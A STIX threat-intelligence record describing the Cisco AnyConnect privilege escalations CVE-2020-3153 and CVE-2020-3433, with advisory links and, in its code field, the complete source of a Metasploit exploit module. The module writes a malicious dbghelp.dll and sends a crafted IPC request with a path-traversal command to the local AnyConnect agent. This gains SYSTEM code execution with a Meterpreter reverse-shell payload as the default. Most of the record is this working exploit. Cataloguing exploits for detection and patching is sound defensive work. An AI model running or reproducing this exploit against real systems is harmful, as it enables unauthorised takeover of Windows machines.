{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39438c1c-39ae-4643-90ca-009f1ab79f64",
    "created": "2024-08-14T16:50:13.462139Z",
    "modified": "2024-08-14T16:50:13.462144Z",
    "name": "Cisco AnyConnect Privilege Escalations (CVE-2020-3153 and CVE-2020-3433)",
    "description": " The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.8.02042 is vulnerable to path traversal and allows local attackers to create/overwrite files in arbitrary locations with system level privileges.  The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.9.00086 is vulnerable to a DLL hijacking and allows local attackers to execute code on the affected machine with with system level privileges.  Both attacks consist in sending a specially crafted IPC request to the TCP port 62522 on the loopback device, which is exposed by the Cisco AnyConnect Secure Mobility Agent service. This service will then launch the vulnerable installer component (`vpndownloader`), which copies itself to an arbitrary",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/anyconnect_lpe.rb",
            "external_id": "anyconnect_lpe.rb"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-cisco-anyconnect-privilege-elevation-through-path-traversal/"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ac-win-path-traverse-qO4HWBsj"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-3153"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-anyconnect-dll-F26WwJW"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-3433"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco AnyConnect Privilege Escalations (CVE-2020-3153 and CVE-2020-3433)',\n        'Description' => %q{\n          The installer component of Cisco AnyConnect Secure Mobility Client for Windows\n          prior to 4.8.02042 is vulnerable to path traversal and allows local attackers\n          to create/overwrite files in arbitrary locations with system level privileges.\n\n          The installer component of Cisco AnyConnect Secure Mobility Client for Windows\n          prior to 4.9.00086 is vulnerable to a DLL hijacking and allows local attackers\n          to execute code on the affected machine with with system level privileges.\n\n          Both attacks consist in sending a specially crafted IPC request to the TCP\n          port 62522 on the loopback device, which is exposed by the Cisco AnyConnect\n          Secure Mobility Agent service. This service will then launch the vulnerable\n          installer component (`vpndownloader`), which copies itself to an arbitrary\n          location (CVE-2020-3153) or with a supplied DLL (CVE-2020-3433) before being\n          executed with system privileges. Since `vpndownloader` is also vulnerable to DLL\n          hijacking, a specially crafted DLL (`dbghelp.dll`) is created at the same\n          location `vpndownloader` will be copied to get code execution with system\n          privileges.\n\n          The CVE-2020-3153 exploit has been successfully tested against Cisco AnyConnect\n          Secure Mobility Client versions 4.5.04029, 4.5.05030 and 4.7.04056 on Windows 10\n          version 1909 (x64) and Windows 7 SP1 (x86); the CVE-2020-3434 exploit has been\n          successfully tested against Cisco AnyConnect Secure Mobility Client versions\n          4.5.02036, 4.6.03049, 4.7.04056, 4.8.01090 and 4.8.03052 on Windows 10 version\n          1909 (x64) and 4.7.4056 on Windows 7 SP1 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yorick Koster', # original PoC CVE-2020-3153, analysis\n          'Antoine Goichot (ATGO)', # PoC CVE-2020-3153, original PoC for CVE-2020-3433, update of msf module\n          'Christophe De La Fuente' # msf module for CVE-2020-3153\n        ],\n        'Platform' => 'win',\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [\n            'Windows x86/x64 with x86 payload',\n            {\n              'Arch' => ARCH_X86\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'References' => [\n          ['URL', 'https://ssd-disclosure.com/ssd-advisory-cisco-anyconnect-privilege-elevation-through-path-traversal/'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ac-win-path-traverse-qO4HWBsj'],\n          ['CVE', '2020-3153'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-anyconnect-dll-F26WwJW'],\n          ['CVE', '2020-3433']\n        ],\n        'DisclosureDate' => '2020-08-05',\n        'Notes' => {\n          'SideEffects' => [ARTIFACTS_ON_DISK],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE]\n        },\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/meterpreter/reverse_tcp',\n          'FileDropperDelay' => 10\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_open\n            ]\n          }\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('INSTALL_PATH', [\n        false,\n        'Cisco AnyConnect Secure Mobility Client installation path (where \\'vpndownloader.exe\\''\\\n          ' should be found). It will be automatically detected if not set.'\n      ]),\n      OptEnum.new('CVE', [ true, 'Vulnerability to use', 'CVE-2020-3433', ['CVE-2020-3433', 'CVE-2020-3153']])\n    ]\n  end\n\n  # See AnyConnect IPC protocol articles:\n  # - https://www.serializing.me/2016/12/14/anyconnect-elevation-of-privileges-part-1/\n  # - https://www.serializing.me/2016/12/20/anyconnect-elevation-of-privileges-part-2/\n  # - https://www.serializing.me/2023/01/27/anyconnect-inter-process-communication/\n  class CIPCHeader < BinData::Record\n    endian :little\n\n    uint32 :id_tag, label: 'ID Tag', value: 0x4353434f\n    uint16 :header_length, label: 'Header Length', initial_value: -> { num_bytes }\n    uint16 :data_length, label: 'Data Length', initial_value: -> { parent.body.num_bytes }\n    uint32 :ipc_repsonse_cb, label: 'IPC response CB', initial_value: 0xFFFFFFFF\n    uint32 :msg_user_context, label: 'Message User Context', initial_value: 0x00000000\n    uint32 :request_msg_id, label: 'Request Message Id', initial_value: 0x00000002\n    uint32 :return_ipc_object, label: 'Return IPC Object', initial_value: 0x00000000\n    uint8 :message_type, label: 'Message Type', initial_value: 1\n    uint8 :message_id, label: 'Message ID', initial_value: 2\n  end\n\n  class CIPCTlv < BinData::Record\n    # TLVs are tricky when it comes to endieness. For the type and length fields, they're big endian, but\n    # for the value, they're little endian. For example, each UTF-16 character, is encoded in one little\n    # endian unsigned short. There is one exception to that rule: UTF-8 strings and TV (Type and Value)\n    # entries. Note that TVs, are the ones that have a Type like 0x80XX, which are used to store some\n    # booleans and unsigned shorts.\n    # This is why having the entire \"BinData::Record\" as big endian is not a problem in this case: the IPC\n    # message to which the vulnerabilit(ies) are associated, only makes use of UTF-8 strings and a boolean.\n    endian :big\n\n    uint16 :msg_type, label: 'Type'\n    uint16 :msg_length, label: 'Length', initial_value: -> { msg_value.num_bytes }\n    stringz :msg_value, label: 'Value', length: -> { msg_length }\n  end\n\n  class CIPCMessage < BinData::Record\n    endian :little\n\n    cipc_header :header, label: 'Header'\n    array :body, label: 'Body', type: :cipc_tlv, read_until: :eof\n  end\n\n  def detect_path\n    program_files_paths = Set.new([get_env('ProgramFiles')])\n    program_files_paths << get_env('ProgramFiles(x86)')\n    path = 'Cisco\\\\Cisco AnyConnect Secure Mobility Client'\n\n    program_files_paths.each do |program_files_path|\n      next unless file_exist?([program_files_path, path, 'vpndownloader.exe'].join('\\\\'))\n\n      return \"#{program_files_path}\\\\#{path}\"\n    end\n\n    nil\n  end\n\n  def sanitize_path(path)\n    return nil unless path\n\n    path = path.strip\n    loop do\n      break if path.last != '\\\\'\n\n      path.chop!\n    end\n    path\n  end\n\n  def check\n    install_path = sanitize_path(datastore['INSTALL_PATH'])\n    if install_path&.!= ''\n      vprint_status(\"Skipping installation path detection and use provided path: #{install_path}\")\n      @installation_path = file_exist?([install_path, 'vpndownloader.exe'].join('\\\\')) ? install_path : nil\n    else\n      vprint_status('Try to detect installation path...')\n      @installation_path = detect_path\n    end\n\n    unless @installation_path\n      return CheckCode.Safe('vpndownloader.exe not found on file system')\n    end\n\n    file_path = \"#{@installation_path}\\\\vpndownloader.exe\"\n    vprint_status(\"Found vpndownloader.exe path: '#{file_path}'\")\n\n    version = file_version(file_path)\n    unless version\n      return CheckCode.Unknown('Unable to retrieve vpndownloader.exe file version')\n    end\n\n    cve_2020_3153 = (datastore['CVE'] == 'CVE-2020-3153')\n\n    patched_version_cve_2020_3153 = Rex::Version.new('4.8.02042')\n    patched_version_cve_2020_3433 = Rex::Version.new('4.9.00086')\n    @ac_version = Rex::Version.new(version.join('.'))\n    if @ac_version < patched_version_cve_2020_3153\n      return CheckCode.Appears(\"Cisco AnyConnect version #{@ac_version} < #{patched_version_cve_2020_3153} (CVE-2020-3153 & CVE-2020-3433).\")\n    elsif (@ac_version < patched_version_cve_2020_3433) && !cve_2020_3153\n      return CheckCode.Appears(\"Cisco AnyConnect version #{@ac_version} < #{patched_version_cve_2020_3433} (CVE-2020-3433).\")\n    elsif (@ac_version < patched_version_cve_2020_3433) && cve_2020_3153\n      return CheckCode.Safe(\"Cisco AnyConnect version #{@ac_version} >= #{patched_version_cve_2020_3153} (However CVE-2020-3433 can be used).\")\n    else\n      return CheckCode.Safe(\"Cisco AnyConnect version #{@ac_version} >= #{patched_version_cve_2020_3433}.\")\n    end\n  end\n\n  def exploit\n    fail_with(Failure::None, 'Session is already elevated') if is_system?\n    if !payload.arch.include?(ARCH_X86)\n      fail_with(Failure::None, 'Payload architecture is not compatible with this module. Please, select an x86 payload')\n    end\n\n    check_result = check\n    print_status(check_result.message)\n    if check_result == CheckCode::Safe && !@installation_path\n      fail_with(Failure::NoTarget, 'Installation path not found (try to set INSTALL_PATH if automatic detection failed)')\n    end\n\n    cac_cmd = '\"CAC-nc-install'\n    if @ac_version && @ac_version >= Rex::Version.new('4.7')\n      vprint_status('\"-ipc\" argument needed')\n      cac_cmd << \"\\t-ipc=#{rand_text_numeric(5)}\"\n    else\n      vprint_status('\"-ipc\" argument not needed')\n    end\n\n    cve_2020_3153 = (datastore['CVE'] == 'CVE-2020-3153')\n    if cve_2020_3153\n      program_data_path = get_env('ProgramData')\n      dbghelp_path = \"#{program_data_path}\\\\Cisco\\\\dbghelp.dll\"\n    else\n      temp_path = get_env('TEMP')\n      junk = Rex::Text.rand_text_alphanumeric(6)\n      temp_path << \"\\\\#{junk}\"\n      mkdir(temp_path)\n      dbghelp_path = \"#{temp_path}\\\\dbghelp.dll\"\n    end\n\n    print_status(\"Writing the payload to #{dbghelp_path}\")\n\n    begin\n      payload_dll = generate_payload_dll(dll_exitprocess: true)\n      write_file(dbghelp_path, payload_dll)\n      register_file_for_cleanup(dbghelp_path)\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NotFound, e.message)\n    end\n\n    if cve_2020_3153\n      # vpndownloader.exe will be copied to \"C:\\ProgramData\\Cisco\\\" (assuming the\n      # normal process will copy the file to\n      # \"C:\\ProgramData\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Temp\\Installer\\XXXX.tmp\\\")\n      register_file_for_cleanup(\"#{program_data_path}\\\\Cisco\\\\vpndownloader.exe\")\n      junk = Rex::Text.rand_text_alphanumeric(4)\n      cac_cmd << \"\\t#{@installation_path}\\\\#{junk}\\\\#{junk}\\\\#{junk}\\\\#{junk}\\\\../../../../vpndownloader.exe\\t-\\\"\"\n    else\n      cac_cmd << \"\\t#{@installation_path}\\\\vpndownloader.exe\\t#{dbghelp_path}\\\"\"\n    end\n\n    vprint_status(\"IPC Command: #{cac_cmd}\")\n\n    cipc_msg = CIPCMessage.new\n    cipc_msg.body << CIPCTlv.new(\n      msg_type: 2,\n      msg_value: cac_cmd\n    )\n    cipc_msg.body << CIPCTlv.new(\n      msg_type: 6,\n      msg_value: \"#{@installation_path}\\\\vpndownloader.exe\"\n    )\n\n    vprint_status('Connecting to the AnyConnect agent on 127.0.0.1:62522')\n    begin\n      socket = client.net.socket.create(\n        Rex::Socket::Parameters.new(\n          'PeerHost' => '127.0.0.1',\n          'PeerPort' => 62522,\n          'Proto' => 'tcp'\n        )\n      )\n    rescue Rex::ConnectionError => e\n      fail_with(Failure::Unreachable, e.message)\n    end\n\n    vprint_status(\"Send the encoded IPC command (size = #{cipc_msg.num_bytes} bytes)\")\n    socket.write(cipc_msg.to_binary_s)\n    socket.flush\n    # Give FileDropper some time to cleanup before handing over to the operator\n    Rex.sleep(3)\n  ensure\n    if socket\n      vprint_status('Shutdown the socket')\n      socket.shutdown\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-08-05",
    "x_mitre_platforms": [
        "win'"
    ]
}